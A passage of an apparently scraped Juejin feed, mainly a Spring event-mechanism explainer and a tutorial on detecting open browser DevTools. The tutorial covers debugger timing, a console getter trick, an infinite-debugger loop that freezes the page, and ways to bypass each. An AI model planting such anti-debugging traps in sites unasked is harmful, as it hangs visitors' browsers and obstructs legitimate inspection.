<li>事件通知机制通常采用"发布-订阅"模式，这正是观察者模式的典型应用场景</li>
</ul>
<h2 data-id="heading-1">2. <strong>Spring 事件机制确实使用了观察者模式</strong></h2>
<p>Spring 框架的<strong>事件驱动机制</strong>（ApplicationEvent）是观察者模式的<strong>标准实现</strong>：</p>






























<table><thead><tr><th>Spring 组件</th><th>观察者模式角色</th><th>说明</th></tr></thead><tbody><tr><td><code>ApplicationContext</code></td><td>事件源（Subject）</td><td>触发事件的主体，继承自 <code>ApplicationEventPublisher</code></td></tr><tr><td><code>ApplicationEvent</code></td><td>事件（事件对象）</td><td>继承自 JDK 的 <code>EventObject</code>，携带事件数据</td></tr><tr><td><code>ApplicationListener</code></td><td>观察者（Observer）</td><td>监听特定事件，事件发生时 <code>onApplicationEvent()</code> 方法被回调</td></tr><tr><td><code>ApplicationEventMulticaster</code></td><td>事件广播器</td><td>负责注册监听器和广播事件，解耦发布者和订阅者</td></tr></tbody></table>
<h2 data-id="heading-2">3. <strong>"Spring 本地消息"的理解</strong></h2>
<p>您提到的"Spring 本地消息"通常指的是<strong>Spring 事件机制</strong>（进程内事件通知），与跨进程的 MQ 消息队列不同：</p>
<ul>
<li><strong>同一 JVM 进程内</strong>的组件解耦通信</li>
<li>通过 <code>ApplicationEventPublisher.publishEvent()</code> 发布事件</li>
<li>监听器通过 <code>@EventListener</code> 注解或实现 <code>ApplicationListener</code> 接口来接收通知</li>
</ul>
<h2 data-id="heading-3">典型应用场景</h2>
<p>例如用户注册成功后，需要同时发送短信、邮件和优惠券：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 发布事件</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-meta">@Autowired</span> <span class="hljs-keyword">private</span> ApplicationEventPublisher publisher;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(String username)</span> {
        <span class="hljs-comment">// 保存用户...</span>
        publisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRegisterEvent</span>(<span class="hljs-built_in">this</span>, username));
    }
}

<span class="hljs-comment">// 监听事件（多个观察者）</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailListener</span> {
    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendEmail</span><span class="hljs-params">(UserRegisterEvent event)</span> { <span class="hljs-comment">/* ... */</span> }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsListener</span> {
    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendSms</span><span class="hljs-params">(UserRegisterEvent event)</span> { <span class="hljs-comment">/* ... */</span> }
}
</code></pre>
<p><strong>总结</strong>：事件通知机制通常基于观察者模式实现，而 Spring 的事件机制（即您说的"本地消息"）正是这一模式的典型应用，提供了进程内组件间松耦合通信的能力。</p>
<p>以下是 Spring 事件机制中各组件协作关系的流程图，完整展示了从事件发布到处理的全生命周期：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────────────────┐
│                       Spring 容器初始化阶段                                │
└─────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  <span class="hljs-number">1</span>. 扫描并发现所有 ApplicationListener 实现类（如 EmailListener）          │
│  <span class="hljs-number">2</span>. 将监听器注册到 ApplicationEventMulticaster 的注册表                  │
│     （内部维护 Map&lt;Class&lt;?&gt;, List&lt;ApplicationListener&gt;&gt; 映射关系）       │
└─────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                        运行时事件发布处理流程                              │
└─────────────────────────────────────────────────────────────────────────┘
                                   │
                                   │
     ┌─────────────────────────────┼──────────────────────────────────┐
     │  用户注册业务逻辑完成           │                                  │
     │                               ▼                                  │
     │              ┌──────────────────────────────────┐                │
     │              │ ApplicationContext (ConcreteSubject)│            │
     │              │   - 事件发布入口                     │            │
     │              └──────────────────────────────────┘                │
     │                               │ <span class="hljs-built_in">publishEvent</span>()                    │
     │                               ▼                                  │
     │              ┌──────────────────────────────────┐                │
     │              │  UserRegisterEvent (ConcreteEvent)  │            │
     │              │   - 封装事件数据（用户、时间戳等）        │            │
     │              │   - extends ApplicationEvent        │            │
     │              └──────────────────────────────────┘                │
     │                               │                                  │
     │                               ▼                                  │
     └─────────────────────────────&gt;│                                  │
                                    │                                  │
     ┌─────────────────────────────────────────────────────────────┐    │
     │         ApplicationEventMulticaster (事件广播器)               │    │
     │         - 管理所有监听器注册表                                   │    │
     │         - 匹配事件类型与监听器                                   │    │
     │                                                               │    │
     │  ┌──────────────────────────────────────────────────────────┐ │    │
     │  │  <span class="hljs-number">1</span>. 接收事件                                              │ │    │
     │  │  <span class="hljs-number">2</span>. 根据事件类型 UserRegisterEvent 查找匹配的监听器列表   │ │    │
     │  │  <span class="hljs-number">3</span>. 遍历调用监听器回调方法                                │ │    │
     │  └──────────────────────────────────────────────────────────┘ │    │
     └─────────────────────────────────────────────────────────────┘    │
                                   │                                  │
              ┌───────────────────┼───────────────────┐              │
              │                   │                   │              │
              ▼                   ▼                   ▼              │
     ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐     │
     │ EmailListener   │ │ CouponListener  │ │ SmsListener     │     │
     │  (观察者<span class="hljs-number">1</span>)        │ │  (观察者<span class="hljs-number">2</span>)        │ │  (观察者<span class="hljs-number">3</span>)        │     │
     │                 │ │                 │ │                 │     │
     │onApplicationEvent│ │onApplicationEvent│ │onApplicationEvent│     │
     │                 │ │                 │ │                 │     │
     └─────────────────┘ └─────────────────┘ └─────────────────┘     │
              │                   │                   │              │
              │                   │                   │              │
              ▼                   ▼                   ▼              │
     ┌─────────────────────────────────────────────────────────────┐    │
     │              业务处理（发送邮件、发放优惠券、发送短信）           │    │
     └─────────────────────────────────────────────────────────────┘    │
                                                                       │
     ┌─────────────────────────────────────────────────────────────┐    │
     │              <span class="hljs-keyword">@Async</span> 可选：异步线程池执行监听器逻辑                │    │
     └─────────────────────────────────────────────────────────────┘    │
</code></pre>
<h2 data-id="heading-4">关键协作关系说明</h2>
<h3 data-id="heading-5">1. <strong>ApplicationContext (ConcreteSubject)</strong></h3>
<ul>
<li><strong>职责</strong>：作为事件发布入口，持有 <code>ApplicationEventPublisher</code> 接口</li>
<li><strong>核心方法</strong>：<code>publishEvent(event)</code></li>
<li><strong>位置</strong>：继承自 <code>ApplicationEventPublisher</code> 接口，实际调用委托给 Multicaster</li>
</ul>
<h3 data-id="heading-6">2. <strong>UserRegisterEvent (ConcreteEvent)</strong></h3>
<ul>
<li><strong>职责</strong>：封装具体业务数据，继承自 <code>ApplicationEvent</code></li>
<li><strong>关键属性</strong>：<code>source</code>（事件源对象）、<code>timestamp</code>（发布时间）</li>
<li><strong>作用</strong>：作为载体在组件间传递信息</li>
</ul>
<h3 data-id="heading-7">3. <strong>ApplicationEventMulticaster (事件广播器核心)</strong></h3>
<ul>
<li><strong>本质</strong>：观察者模式中的 <strong>"调度中心"</strong></li>
<li><strong>核心功能</strong>：
<ul>
<li><strong>注册</strong>：<code>addApplicationListener()</code> 管理所有监听器列表</li>
<li><strong>匹配</strong>：根据事件类型动态筛选匹配的 <code>ApplicationListener</code></li>
<li><strong>广播</strong>：<code>multicastEvent()</code> 遍历调用监听器回调</li>
</ul>
</li>
<li><strong>实现类</strong>：默认使用 <code>SimpleApplicationEventMulticaster</code>，支持同步/异步广播</li>
</ul>
<h3 data-id="heading-8">4. <strong>ApplicationListener (Observer)</strong></h3>
<ul>
<li><strong>职责</strong>：事件处理逻辑载体</li>
<li><strong>两种实现方式</strong>：
<ul>
<li><strong>接口实现</strong>：实现 <code>ApplicationListener&lt;UserRegisterEvent&gt;</code> 接口</li>
<li><strong>注解方式</strong>：使用 <code>@EventListener</code> 注解方法（推荐）</li>
</ul>
</li>
<li><strong>扩展能力</strong>：支持 <code>@Order</code> 控制执行顺序、<code>@Async</code> 异步执行</li>
</ul>
<h2 data-id="heading-9">时序流程（简化版）</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant UserService as 用户服务
    participant Context as ApplicationContext
    participant Event as UserRegisterEvent
    participant Multicaster as ApplicationEventMulticaster
    participant Listeners as ApplicationListener列表

    UserService-&gt;&gt;Context: registerUser()
    Context-&gt;&gt;Event: 创建事件对象
    Context-&gt;&gt;Multicaster: publishEvent(event)
    Multicaster-&gt;&gt;Listeners: multicastEvent(event)
    loop 对每个匹配的监听器
        Multicaster-&gt;&gt;Listeners: onApplicationEvent(event)
        Listeners--&gt;&gt;Listeners: 处理业务逻辑
    end
    Listeners--&gt;&gt;Multicaster: 返回
    Multicaster--&gt;&gt;Context: 返回
    Context--&gt;&gt;UserService: 完成
</code></pre>
<hr/>
<p><strong>总结</strong>：<code>ApplicationEventMulticaster</code> 作为<strong>核心调度器</strong>，在发布者和订阅者之间实现了<strong>解耦</strong>，是整个观察者模式能够灵活运作的中枢神经。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[检测开发者工具是否打开？这几种方法让黑客无处遁形🤣]]></title>    <link>https://juejin.cn/post/7581619505584128051</link>    <guid>https://juejin.cn/post/7581619505584128051</guid>    <pubDate>2025-12-09T02:54:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584128051" data-draft-id="7581374664327315507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="检测开发者工具是否打开？这几种方法让黑客无处遁形🤣"/> <meta itemprop="keywords" content="前端,JavaScript,前端框架"/> <meta itemprop="datePublished" content="2025-12-09T02:54:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            检测开发者工具是否打开？这几种方法让黑客无处遁形🤣
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:54:42.000Z" title="Tue Dec 09 2025 02:54:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be74d43fd534de5a4dd96ea18a2075a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=OiOSXoPShXsr5SztLkLwb%2Fh3A4I%3D" alt="image.png" loading="lazy"/></p>
<p>大家好，我来了😁。</p>
<p><strong>前端代码在浏览器里是裸奔的。</strong>——这几乎是所有开发者的共识。</p>
<p>只要用户按一下 <code>F12</code>，你的源码、你的接口、你的数据结构，全部一览无余。黑客可以修改你的变量，脚本小子可以刷你的接口，竞品可以分析你的逻辑。</p>
<p>很多老板会问：能不能禁止用户打开控制台？</p>
<p>通常我们的回答是：不能。浏览器是用户的地盘，我们无权干涉。</p>
<p>但是， <strong>禁止不了，不代表我们检测不到。</strong></p>
<p>如果在检测到用户打开 DevTools 的那一瞬间，我们立马<strong>清空敏感数据</strong>、<strong>停止视频播放</strong>、或者<strong>无限 debugger 卡死页面</strong>，是不是就能极大地提高攻击者的门槛？🤔</p>
<p>今天，我就来分享几种利用浏览器API技巧实现的 <strong>DevTools 检测技术</strong>。</p>
<hr/>
<h4 data-id="heading-0"><strong>1.利用 <code>debugger</code> 的时间差</strong></h4>
<p>这是最古老、最暴力，但也最有效的方法之一。</p>
<p>原理：</p>
<p>当 DevTools 打开，并且开启了断点调试功能时，代码执行到 debugger 语句会暂停。</p>
<p>而不打开 DevTools 时，debugger 语句会被浏览器忽略，代码瞬间执行过去。</p>
<p>我们可以记录 <code>debugger</code> 语句前后的<strong>时间戳</strong>。如果差值过大，说明代码被暂停了——也就是说，DevTools 肯定是开着的。</p>
<p><strong>具体代码👇：</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkDevTools</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  
  <span class="hljs-comment">// 核心：这就好比在路上设个卡</span>
  <span class="hljs-keyword">debugger</span>; 
  
  <span class="hljs-keyword">const</span> end = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
  
  <span class="hljs-comment">// 如果暂停时间超过 100ms，判定为有人在调试</span>
  <span class="hljs-keyword">if</span> (end - start &gt; <span class="hljs-number">100</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"警告：检测到开发者工具已打开！"</span>);
    <span class="hljs-comment">// 这里可以执行你的防御逻辑：</span>
    <span class="hljs-comment">// window.location.reload(); </span>
    <span class="hljs-comment">// clearSensitiveData();</span>
  }
}

<span class="hljs-comment">// 搞个定时器，每秒查岗一次</span>
<span class="hljs-built_in">setInterval</span>(checkDevTools, <span class="hljs-number">1000</span>);
</code></pre>
<p>优点是简单粗暴，对付小白有效。</p>
<p>缺点的话 有点扰民😖。如果攻击者禁用了断点功能（Deactivate breakpoints），或者设置⚙中配置了Never pause here，这招就废了。</p>
<hr/>
<h4 data-id="heading-1"><strong>2.利用 <code>console.log</code> 的对象懒加载</strong></h4>
<p>这是一个非常骚的检测方法，利用了 Chrome 控制台的一个特性：<strong>对象求值（Object Evaluation）</strong> 。</p>
<p>原理：</p>
<p>当你执行 console.log(obj) 时，浏览器为了性能，并不会立刻把 obj 的所有属性打印出来。它只打印一个引用。</p>
<p>只有当控制台真的是打开状态，并且需要显示内容时，浏览器才会去读取这个对象的属性（getters）。</p>
<p>我们可以给一个对象定义一个 <code>getter</code>（读取器）。如果这个 <code>getter</code> 被触发了，就说明<strong>有一个观察者（DevTools）正在看它</strong>。</p>
<p><strong>直接上代码👇：</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> element = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();

<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(element, <span class="hljs-string">'id'</span>, {
  <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-comment">// 只有当 DevTools 打开时，浏览器尝试获取 element.id 来显示详情</span>
    <span class="hljs-comment">// 这个 getter 才会执行</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'抓到你了！DevTools 是开着的！'</span>);
    
    <span class="hljs-comment">// 执行防御逻辑</span>
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">'请关闭开发者工具继续浏览！'</span>);
    
    <span class="hljs-keyword">return</span> <span class="hljs-string">'detected'</span>;
  }
});

<span class="hljs-comment">// 定时打印这个 element</span>
<span class="hljs-comment">// 如果控制台没开，log 只是静默执行，不会触发 getter</span>
<span class="hljs-comment">// 如果控制台开了，log 为了显示 element 的详情，会触发 getter</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(element);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">clear</span>(); <span class="hljs-comment">// 刷屏清空，防止用户发现</span>
}, <span class="hljs-number">1000</span>);
</code></pre>
<hr/>
<p>优点是隐蔽性极强，不需要 <code>debugger</code>，不会打断代码执行。缺点呢？严重依赖浏览器实现。Chrome 上效果最好，Firefox/Safari 的行为可能不同。</p>
<hr/>
<h4 data-id="heading-2"><strong>3.无限 Debugger (防调试)</strong></h4>
<p>这其实不是检测，而是劝退。</p>
<p>很多网站（比如某些视频站、加密小说站），会用一种让黑客极其恶心的手段：<strong>只要你敢开控制台，我就让你卡死。</strong></p>
<p>原理：</p>
<p>利用 Function.constructor 或 eval，在一个高频循环里不断生成新的 debugger。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 放在一个立即执行函数里</span>
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">anonymous</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 定义一个生成 debugger 的函数</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">debuggerLoop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 通过构造函数生成 debugger，防止源码被静态搜索到</span>
      (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">"debugger"</span>))(); 
    } <span class="hljs-keyword">catch</span> (e) {}
  }

  <span class="hljs-comment">// 只要没被拦截，我就一直递归调用</span>
  <span class="hljs-comment">// 也可以配合 setInterval</span>
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">debuggerLoop</span>();
  }, <span class="hljs-number">50</span>); <span class="hljs-comment">// 每 50ms 炸你一次🤣</span>
})();
</code></pre>
<p>效果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95b25ac655bc43f3b46e61f5047b6d30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=W2t%2FIZzyiwQLlfrTGmqzhbPxZMI%3D" alt="image.png" loading="lazy"/></p>
<p>一旦你打开 F12，你的浏览器就会立刻被无数个断点暂停。点击继续运行？没用，50ms 后下一个断点又来了。你的页面基本处于假死状态，根本没法操作 DOM 或发请求。</p>
<p>这也是为什么你在调试某些网站时，会发现 <code>Sources</code> 面板里全是 <code>VMxxxx</code> 开头的匿名脚本，而且一直卡在 <code>debugger</code> 上。</p>
<hr/>
<h4 data-id="heading-3"><strong>如何绕过呢？🤔</strong></h4>
<p>作为补充，我必须告诉你，这些防御<strong>都不是无敌的</strong>。</p>
<p><strong>对于无限 Debugger：</strong></p>
<ol>
<li><strong>禁用断点</strong>：在 Chrome DevTools 里点击那个禁用所有断点的图标，世界瞬间清净了。</li>
</ol>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2eb18ae20bbb452f9ac906bb4fa0c82b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=JP0Vx2iUWpG7igBV971gsR%2FC7WY%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li><strong>条件断点</strong>：在那个 <code>debugger</code> 行右键 -&gt; 停用断点。</li>
</ol>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17b75a3b47e340a0bb1f118572367334~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=Q0qCbHYJlla8dBibXIy3XHSfSjc%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li><strong>本地替换</strong>：用 Chrome 的 本地替换功能，把那段 JS 代码替换成本地空文件。</li>
</ol>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4f16fb8bcdf4bb092e764b0aabcc5af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=inXbW7V5BQUA7XBACLC08Bg%2Btk8%3D" alt="image.png" loading="lazy"/></p>
<p>对于Getter 检测呢？🤔</p>
<p>黑客可以直接 Hook console.log，让它失效😖。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 你的检测逻辑就废了</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">console</span>.<span class="hljs-property">log</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {}; 
</code></pre>
<hr/>
<p>任何前端安全手段，本质上都是 <strong>防君子，防不了小人</strong>，或者说是<strong>提高攻击门槛</strong>。</p>
<p>在浏览器这个完全开放的环境里，没有什么秘密能真正藏得住。</p>
<p><strong>不要把核心业务逻辑（比如金额计算、权限校验）放在前端。</strong></p>
<p>这些检测手段，更多是用来保护<strong>知识产权</strong>（防止小白扒代码）或者<strong>反爬虫</strong>（检测到调试就停止渲染数据）。</p>
<p><strong>学会这几招，起码能挡住 90% 的脚本小子。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83eae55c2df64ab283a86d5162441714~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853682&amp;x-signature=1xxNUyL4wG5IZ6cg7xW3%2FcA%2FqHI%3D" alt="谢谢大家.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[简单了解：Android14中的Input event]]></title>    <link>https://juejin.cn/post/7581350888789671972</link>    <guid>https://juejin.cn/post/7581350888789671972</guid>    <pubDate>2025-12-09T02:36:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581350888789671972" data-draft-id="7573863952116154374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="简单了解：Android14中的Input event"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-09T02:36:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="煤球王子"/> <meta itemprop="url" content="https://juejin.cn/user/4088439235949739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            简单了解：Android14中的Input event
